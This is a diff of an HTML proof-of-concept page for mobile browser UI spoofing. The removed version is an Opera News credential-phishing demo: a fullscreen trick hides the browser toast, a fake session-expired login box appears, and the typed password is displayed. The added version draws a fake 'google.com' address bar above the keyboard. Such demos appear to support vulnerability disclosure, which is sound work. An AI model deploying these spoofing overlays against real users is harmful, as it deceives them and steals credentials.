@@ -1,52 +1,119 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PoC UI Redressing Opera News</title>
-    <style>
-        /* Desain UI palsu yang mirip persis dengan komponen asli Opera / Android */
-        #fake-ui {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 99999;
-            color: white; text-align: center; font-family: sans-serif;
-            padding-top: 20%;
-        }
-        .login-box { background: #fff; color:#000; width: 80%; margin: 0 auto; padding: 20px; border-radius: 8px; }
-    </style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fake Mini URL Bar Demo</title>
+<style>
+  
+  button { padding: 12px 18px; font-size: 16px; margin-right: 10px; }
+  textarea { width: 100%; font-size: 18px; padding: 10px; margin-top: 20px; box-sizing: border-box; }
+
+  .fake-bar {
+    text-align: center;
+    background: #fff7f0;
+    border-top: 1px solid #e0cbb0;
+    border-bottom: 1px solid #e0cbb0;
+    color: #222;
+    font-size: 16px;
+    padding: 5px 0;
+    position: fixed;
+    width: 100%;
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, bottom 0.2s ease;
+  }
+
+  .fake-bar.show { opacity: 1; visibility: visible; }
+
+  .spacer { height: 800px; }        /* Space to push middle textarea down */
+  .spacer-bottom { height: 1200px; } /* Space to push bottom text far down */
+
+  .bottom-text { font-size: 20px; text-align: center; margin: 20px; }
+</style>
 </head>
 <body>
 
-    <button onclick="picuFullscreen()">Baca Artikel Lengkap (Trigger)</button>
+<button id="showBtn">Show Keyboard</button>
+<textarea id="ta" placeholder="Textarea at top…"></textarea>
 
-    <div id="fake-ui">
-        <div class="login-box">
-            <h3>Sesi Opera News Berakhir</h3>
-            <p>Silakan login kembali untuk melanjutkan membaca.</p>
-            <input type="text" placeholder="Email/Username" id="user"><br><br>
-            <input type="password" placeholder="Password" id="pass"><br><br>
-            <button onclick="curiData()">Masuk</button>
-        </div>
-    </div>
+<div class="fake-bar" id="fakeBar">google.com</div>
 
-    <script>
-        function picuFullscreen() {
-            let elem = document.documentElement;
-            if (elem.requestFullscreen) { elem.requestFullscreen(); }
-            
-            // Trik lu: Saat masuk fullscreen, toast absen. 
-            // Kita langsung overlap dengan UI palsu setelah jeda sekian milidetik.
-            setTimeout(function() {
-                document.getElementById('fake-ui').style.display = 'block';
-            }, 500);
-        }
+<!-- Spacer to push the middle textarea down -->
+<div class="spacer"></div>
 
-        function curiData() {
-            let u = document.getElementById('user').value;
-            let p = document.getElementById('pass').value;
-            alert('Data sensitif berhasil dicuri!\nUser: ' + u + '\nPass: ' + p);
-        }
-    </script>
+<!-- Middle textarea -->
+<textarea id="middleTa" placeholder="Textarea in the middle of page…"></textarea>
+
+<!-- Spacer to push the bottom text far down -->
+<div class="spacer-bottom"></div>
+
+<!-- Text far down the page -->
+<div class="bottom-text">
+  🎉 You finally scrolled down and found this text! 🎉
+</div>
+
+<script>
+const fakeBar = document.getElementById('fakeBar');
+const ta = document.getElementById('ta');
+const middleTa = document.getElementById('middleTa');
+
+function adjustFakeBar() {
+  const vv = window.visualViewport;
+  let keyboardHeight = 0;
+  if (vv) {
+    keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
+  }
+  fakeBar.style.bottom = keyboardHeight + 'px';
+}
+
+function showFakeBar() {
+  fakeBar.classList.add('show');
+  adjustFakeBar();
+}
+
+function hideFakeBar() {
+  fakeBar.classList.remove('show');
+}
+
+// Update fake bar position when viewport changes (keyboard show/hide)
+if ('visualViewport' in window) {
+  window.visualViewport.addEventListener('resize', () => {
+    if (document.activeElement === ta || document.activeElement === middleTa) adjustFakeBar();
+  });
+}
+
+// Handle orientation changes
+window.addEventListener('orientationchange', adjustFakeBar);
+
+// Button click: show top textarea + fake bar
+document.getElementById("showBtn").onclick = async () => {
+  ta.focus();
+  try {
+    await document.documentElement.requestFullscreen();
+    setTimeout(() => {
+      prompt();
+      document.exitFullscreen().catch(() => {});
+    }, 2020);
+  } catch (e) {}
+
+  setTimeout(async () => {
+    if (navigator.virtualKeyboard?.show) {
+      try { await navigator.virtualKeyboard.show(); } catch(e){}
+    }
+    showFakeBar();
+  }, 150);
+};
+
+// Show fake bar when either textarea is focused
+ta.addEventListener('focus', showFakeBar);
+middleTa.addEventListener('focus', showFakeBar);
+
+// Hide fake bar when either textarea loses focus
+ta.addEventListener('blur', hideFakeBar);
+middleTa.addEventListener('blur', hideFakeBar);
+</script>
+
 </body>
 </html>
